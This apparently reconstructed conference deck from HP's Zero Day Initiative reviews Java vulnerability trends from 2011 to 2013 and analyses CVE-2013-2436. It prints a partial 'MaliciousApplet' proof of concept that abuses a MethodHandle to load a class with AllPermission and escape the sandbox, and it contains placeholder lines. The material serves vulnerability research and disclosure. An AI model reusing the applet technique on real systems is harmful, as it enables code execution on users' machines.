# Java Every-day: Exploiting Software Running on 3 Billion Devices

## Copyright Notice
© Copyright 2013 Hewlett-Packard Development Company, L.P.  
The information contained herein is subject to change without notice.

## Authors
**Brian Gorenc**  
- **Employer:** Hewlett-Packard  
- **Organization:** HP Security Research, Zero Day Initiative  
- **Responsibilities:** Manager, Vulnerability Research; Running Internet’s Crashbin; Verifying EIP == 0x41414141; Organizing Pwn2Own  
- **Free Time:** Endlessly Flowing Code Paths That Don’t Lead to Vulnerabilities  
- **Twitter:** @MaliciousInput, @thezdi

**Jasiel Spelman**  
- **Employer:** Hewlett-Packard  
- **Organization:** HP Security Research, Zero Day Initiative  
- **Responsibilities:** Security Research; Staying Current with the Latest Vulnerabilities; Cursing at IDA; Working During the Evening, Sleeping During the Day  
- **Free Time:** Jumping Out Of Planes; Playing Electric Bass  
- **Twitter:** @WanderingGlitch, @thezdi

## Solution
"Unless it is absolutely necessary to run Java in web browsers, disable it as described below, even after updating to 7u11. This will help mitigate other Java vulnerabilities that may be discovered in the future."  
- DHS-sponsored CERT

## Agenda
1. Introduction
2. Vulnerability Trending and Attack Surface
3. Java Sub-component Weaknesses
4. Leveraging Sub-component Weaknesses
5. Vendor Response Review
6. Conclusion

## Introduction
[Content for the introduction section can be added here.]

## Why Java?
- Surge of ZDI submissions in late 2012 and early 2013
- Industry Focused on Sandbox Bypasses
- Targeted Attacks against Large Software Vendors
- Multiple 0-day Vulnerabilities Demonstrated at Pwn2Own
- Expose the Actual Attack Surface that Oracle’s Java Brings to the Table
- Take an In-Depth Look at the Most Common Vulnerability Types
- Examine Specific Parts of the Attack Surface Being Taken Advantage of by Attackers

## Vulnerability Sample Set
- Scoped to Modern Day Vulnerabilities (Issues Patched Between 2011-2013)
- Root Cause Analysis Performed on Over 120 Unique Java Vulnerabilities
- Entire Zero Day Initiative Database
- Numerous Vulnerabilities Feed
- Penetration Testing Tools
- Exploit Kits
- Six 0-day Vulnerabilities Yet To Be Patched by Oracle
- Threat Landscape: 52,000 Unique Java Malware Samples

## Oracle Java’s Footprint and Software Architecture
### Huge Install Base
- 1.1 Billion Desktops run Java
- 1.4 Billion Java Cards Produced Each Year
- 93% of Java Users Not Running Latest Patch a Month After Release

### Wide-Spread Adoption
- Written Once, Run Anywhere
- Popular in the Financial Marketplace
- Major Inroads in the Mobile Device Space

### Powerful Development Framework
- Over Fifty Sub-components
- Developers Quickly Extend Application
- Ease Complicated Development Tasks

### Wide Range of Capabilities
- Render a User Interface
- Process Complex Fonts and Graphics
- Consume Common Web Service Protocols

### Attacker’s Best Friend
[Further details can be added here.]

## Vulnerability Trending and Attack Surface
### Vulnerability Statistics 2011-2013
- Increased Patching Year-Over-Year
  - 250 Remotely Exploitable Vulnerabilities Patched
  - 50 Issues Patched in 2011
  - 130 in the First Half of 2013
- Consistent Patch Schedule: Once every 3-4 Months
- Oracle Java SE Risk Matrix: CVE and CVSS, Location in the Architecture

### Oracle Java Patch Statistics
- Sub-components Corrected in Each Patch Release Since 2011
  - Deployment
  - 2D
- Double-digit CVE Count in a Single Patch
  - Deployment (10 Vulnerabilities in Feb 2013)
  - JavaFX (12 Vulnerabilities in Feb 2013)
- Severity Indicators
  - Average CVSS Score: 7.67
  - 50% of Issues > CVSS 9.0
- Following Sub-components Account for Half Remotely Exploitable Vulnerabilities
  - Rank 1: Deployment (Average CVSS: 7.39)
  - Rank 2: 2D (Average CVSS: 9.43)
  - Rank 3: Libraries (Average CVSS: 7.24)
  - Rank 4: JavaFX (Average CVSS: 8.83)
  - Rank 5: AWT (Average CVSS: 7.73)

### Zero Day Initiative Submission Trends
- Consistent Submission Rate: Average 5 a Quarter, High of 33 in One Quarter
- Sub-Component Focus: 2D, Libraries, JavaFX, Sound, Deployment
- Emphasis on Severity: Average CVSS: 9.28
- Accounted for 36% of Java’s vulnerabilities with CVSS score of 9.0 or higher

### Insight into Vulnerability Classes (CWE)
- CWE-265: Privilege / Sandbox Issues
- CWE-470: Unsafe Reflection
- CWE-272: Least Privilege Violation
- CWE-843: Type Confusion
- CWE-120: Buffer Overflow
- CWE-122: Heap-based Buffer Overflow
- CWE-121: Stack-based Buffer Overflow
- CWE-119: Improper Restrictions on Buffer Operations
- CWE-787: Out-of-bounds Write
- CWE-125: Out-of-bounds Read
- CWE-822: Untrusted Pointer Dereference
- CWE-190: Integer Overflow
- Other Less Common CWEs: CWE-114: Process Control, CWE-78: OS Command Injection, CWE-416: Use-After-Free

### Different Flavors of CWEs
- Root Cause of Access Violation
  - Integer Overflow (CWE-190) causing Allocation of Smaller than Intended Buffer
  - Incorrect Arithmetic Operation Resulting in Writing Past a Statically Sized Buffer
- CWE-122 Heap-based Buffer Overflows and CWE-787 Out-of-bounds Writes

### Oracle Known About This Weakness For Some Time
- CWE-265 Breakdown and Historical Timeline
- About Half of the Vulnerabilities in Data Set
  - Unsafe Reflection Most Popular, Followed by Least Privilege Violations
- Popular with Exploit Kit Community
  - Nine CVEs Under Active Exploitation Over Last Three Years
  - No Need to Bypass DEP or ASLR Mitigations, It Just Works

### Mapping Vulnerability Class to Sub-components
- Extrapolating Sub-component Weaknesses

### Top 7 Vulnerability Classes in the Java

### Java Sub-component Weaknesses
- **Privilege/Sandbox Issues due to Unsafe Reflection**
  - **Library Sub-component Weaknesses: CVE-2013-2436**
    - Uses Security Exploration’s Issue 54
      - Gives access to ClassLoader.defineClass via a MethodHandle
    - Also Issue 55 (Independently submitted to the ZDI)
    - Call MethodHandle.bindTo on the Applet’s ClassLoader
      - Changes restrictions so that ClassLoader is a valid argument
    - Create a PermissionDomain that contains AllPermission
    - Load a class using the aforementioned PermissionDomain
    - Execute a method within the loaded class that will disable the SecurityManager

```java
public class MaliciousApplet extends Applet {	
    private static MethodHandle defineClassHandle;	
    public static CallSite setDefineClassHandle(MethodHandles.Lookup caller, String name, MethodType type, MethodHandle handle)	
                           throws NoSuchMethodException, IllegalAccessException {	
        defineClassHandle = handle;	
        return null;	
    } 	
    public void init() {	
        try {	
            InvokeDynamic.getClassHandle();	
        } catch (Exception e) { }	
        try {	
            Permissions permissions = new Permissions();	
            permissions.add(new AllPermission());	
            ProtectionDomain protectionDomain = new ProtectionDomain(null, permissions); 	
            ClassLoader myClassLoader = MaliciousApplet.class.getClassLoader();	
            MethodHandle boundMHandle = defineClassHandle.bindTo(myClassLoader);	
            Class evilClass = (Class)boundMHandle.invoke("Evil", CLASS_BYTES, 0, CLASS_BYTES.length, protectionDomain);	
            // At this point you would invoke a method within the evilClass	
        } catch (Exception e) { }	
    }	
}
```

- **Patched in JDK 7u21**
  - sun.invoke.util.Wrapper’s convert method was modified
  - Updated snippet:
    ```java
    private T convert(Object paramObject, Class paramClass, boolean paramBoolean) {	
        if (this == OBJECT) {	
            assert (!paramClass.isPrimitive());	
            if (!paramClass.isInterface()) {	
                paramClass.cast(paramObject);	
            }	
            ...	
        }
    }
    ```

- **Updated Implementation:**
    ```java
    private T convert(Object paramObject, Class paramClass, boolean paramBoolean) {	
        if (this == OBJECT) {	
            localObject1 = paramObject;	
            return localObject1;	
        }	
        Object localObject1 = wrapperType(paramClass);	
        if (((Class)localObject1).isInstance(paramObject)) {	
            localObject2 = paramObject;	
            return localObject2;	
        }	
        Object localObject2 = paramObject.getClass();	
        if (!paramBoolean) {	
            localObject3 = findWrapperType((Class)localObject2);	
            if ((localObject3 == null) || (!isConvertibleFrom((Wrapper)localObject3))) {	
                throw newClassCastException((Class)localObject1, (Class)localObject2);	
            }	
        }
    }
    ```

This document provides a comprehensive overview of the current state of Java security, focusing on the most common vulnerabilities and the steps taken to mitigate them.